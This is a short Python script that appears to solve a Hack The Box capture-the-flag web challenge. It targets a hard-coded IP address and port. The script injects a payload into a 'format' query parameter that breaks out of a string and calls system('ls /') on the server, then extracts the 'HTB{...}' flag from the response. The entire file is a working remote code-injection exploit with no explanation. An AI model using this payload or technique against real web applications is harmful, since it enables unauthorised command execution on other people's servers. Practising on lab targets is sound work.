#!/usr/bin/python3

from re import findall

from requests import get

url = "http://178.128.162.158:30796/?format="

get(url + 'r')

r = get(url + '").system(\'ls /\'); //')

#print(r.text)

print(findall("HTB{.*", r.text)[0])